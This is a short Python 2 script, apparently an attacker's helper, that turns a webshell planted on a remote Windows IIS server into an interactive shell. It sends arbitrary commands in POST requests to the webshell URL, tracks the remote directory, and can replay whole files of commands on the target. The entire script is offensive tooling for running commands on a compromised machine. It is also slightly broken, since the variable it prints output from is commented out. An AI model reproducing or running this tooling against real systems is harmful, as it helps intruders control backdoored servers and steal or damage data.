#!/usr/bin/python
import urllib
import requests
import fileinput
import re

# tool for making webshells (or exploits that are effectively webshells) feel more like a real shell

pwd = 'C:\\Inetpub\\wwwroot\\' # directory the webshell runs in on the remote machine
command = 'dir' # initial command that runs when starting the shell

def shell_command(cmd):
	# here we set up our exploit/injection/malicious request
	action = "cd " + pwd + " & " + cmd.rstrip('\n') + " 2>&1"
        r = requests.post(url = "[webshell url]", data = {'cmd': action})
        output = r.text
	# often the output contains a bunch of unwanted text. filter it here; only print what we want
        #lines = output.split('\r\n')[9:] # skip the first several lines
	# output is html, replace <br> with newline char to render nicely in console
        for line in lines:
        	print re.sub('<br>\n','\n',re.sub('\n<br>\n','\n',line))


while command != "exit" and command != "quit":
	if command[0:3] == "cd ":
		if command[3:] == "..":
			# up a dir
			cutoff = pwd[:-1].rfind('\\')
			pwd = pwd[:cutoff] + '\\'
		else:
			pwd += command[3:] + "\\"
	elif command.startswith("run_file "):
		if len(command) < 10:
			print "need filename"
		else:	
			arg = command[9:]
			with open(arg) as f:
				f_lines = f.readlines()
			for ln in f_lines:
				print " > " + ln
				shell_command(ln)
	elif command == "localhelp":
		print "run_file [filename] - runs the lines in [filename] -- useful with dos-sendfiles.sh"
		print "cd - works only in the immediate directory with directory names or .."
		print "exit - duh"
	else:
		shell_command(command)
	command = raw_input(pwd + " > ").rstrip('\n')

